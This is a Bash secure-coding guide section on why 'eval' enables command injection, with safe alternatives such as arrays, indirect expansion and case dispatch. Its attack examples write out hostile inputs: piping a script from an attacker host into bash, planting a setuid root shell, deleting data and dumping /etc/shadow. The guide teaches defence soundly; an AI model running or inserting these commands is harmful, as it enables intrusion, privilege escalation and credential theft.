## Eval Command

**Never use `eval` with untrusted input. Avoid `eval` entirely unless absolutely necessary.**

**Rationale:**
- **Code Injection**: `eval` executes arbitrary code with full script privileges—no sandboxing
- **Bypasses All Validation**: Sanitized input can still contain metacharacters enabling injection
- **Difficult to Audit**: Dynamic code construction prevents security review
- **Better Alternatives Exist**: Arrays, indirect expansion, and associative arrays cover nearly all use cases

**Understanding eval:**

`eval` performs all expansions on a string, then executes the result—double expansion is the danger:

```bash
var='$(whoami)'
eval "echo $var"  # First: echo $(whoami) �' Second: executes whoami!
```

**Attack Example 1: Direct Command Injection**

```bash
# VULNERABLE - user_input executed directly
eval "$user_input"
```

**Attack:**
```bash
./script.sh 'curl https://attacker.com/backdoor.sh | bash'
./script.sh 'cp /bin/bash /tmp/rootshell; chmod u+s /tmp/rootshell'
```

**Attack Example 2: Variable Name Injection**

```bash
# VULNERABLE - seems safe but isn't
eval "$var_name='$var_value'"
```

**Attack:**
```bash
./script.sh 'x=$(rm -rf /important/data)' 'ignored'
# Executes: x=$(rm -rf /important/data)='ignored'
```

**Attack Example 3: Log Injection**

```bash
# VULNERABLE logging function
log_event() {
  local -- log_template='echo "$timestamp - Event: $event" >> /var/log/app.log'
  eval "$log_template"
}
```

**Attack:**
```bash
./script.sh 'login"; cat /etc/shadow > /tmp/pwned; echo "'
# Executes three commands including the malicious cat
```

**Safe Alternative 1: Arrays for Command Construction**

```bash
# ✓ Correct - no eval needed
build_find_command() {
  local -a cmd=(find "$search_path" -type f -name "$file_pattern")
  "${cmd[@]}"
}
```

**Safe Alternative 2: Indirect Expansion for Variable References**

```bash
# ✗ Wrong
eval "value=\\$$var_name"

# ✓ Correct - read variable
echo "${!var_name}"

# ✓ Correct - assign variable
printf -v "$var_name" '%s' "$value"
```

**Safe Alternative 3: Associative Arrays for Dynamic Data**

```bash
# ✗ Wrong
for i in {1..5}; do
  eval "var_$i='value $i'"
done

# ✓ Correct
declare -A data
for i in {1..5}; do
  data["var_$i"]="value $i"
done
echo "${data[var_3]}"
```

**Safe Alternative 4: Case/Arrays for Function Dispatch**

```bash
# ✗ Wrong
eval "${action}_function"

# ✓ Correct - case statement
case "$action" in
  start)   start_function ;;
  stop)    stop_function ;;
  *)       die 22 "Invalid action ${action@Q}" ;;
esac

# ✓ Correct - associative array
declare -A actions=([start]=start_function [stop]=stop_function)
if [[ -v "actions[$action]" ]]; then
  "${actions[$action]}"
fi
```

**Safe Alternative 5: Direct Command Substitution**

```bash
# ✗ Wrong
eval "output=\$($cmd)"

# ✓ Correct - array
declare -a cmd=(ls -la /tmp)
output=$("${cmd[@]}")
```

**Safe Alternative 6: Validated Parsing**

```bash
# ✗ Wrong
eval "$config_line"  # PORT=8080

# ✓ Correct - validate key before assignment
IFS='=' read -r key value <<< "$config_line"
if [[ "$key" =~ ^[A-Z_][A-Z0-9_]*$ ]]; then
  declare -g "$key=$value"
fi
```

**Edge Cases:**

**Dynamic variable names in loops:**
```bash
# Use associative array instead
declare -A service_status
for service in nginx apache mysql; do
  service_status["$service"]=$(systemctl is-active "$service")
done
```

**Building complex commands:**
```bash
# ✗ Wrong - string concatenation with eval
cmd="find /data -type f"
[[ -n "$pattern" ]] && cmd="$cmd -name '$pattern'"
eval "$cmd"

# ✓ Correct - array
declare -a cmd=(find /data -type f)
[[ -n "$pattern" ]] && cmd+=(-name "$pattern")
"${cmd[@]}"
```

**Anti-patterns:**

```bash
# ✗ eval with user input �' ✓ whitelist with case
eval "$user_command"
case "$user_command" in
  start|stop) systemctl "$user_command" myapp ;;
esac

# ✗ eval for variable assignment �' ✓ printf -v
eval "$var_name='$var_value'"
printf -v "$var_name" '%s' "$var_value"

# ✗ eval to check if variable set �' ✓ -v test
eval "if [[ -n \\$$var_name ]]; then echo set; fi"
if [[ -v "$var_name" ]]; then echo set; fi

# ✗ double expansion �' ✓ indirect expansion
eval "echo \$$var_name"
echo "${!var_name}"
```

**Detecting eval usage:**

```bash
grep -rn 'eval.*\$' /path/to/scripts/  # Find dangerous eval
shellcheck -x script.sh                 # SC2086 warns about eval
```

**Summary:**
- **Never use eval with untrusted input**—no exceptions
- **Use arrays** for dynamic commands: `cmd=(find); cmd+=(-name "*.txt"); "${cmd[@]}"`
- **Use indirect expansion**: `${!var_name}`
- **Use associative arrays**: `declare -A data; data[$key]=$value`
- **Use case/arrays** for function dispatch
- **Key principle:** If you think you need `eval`, you're solving the wrong problem
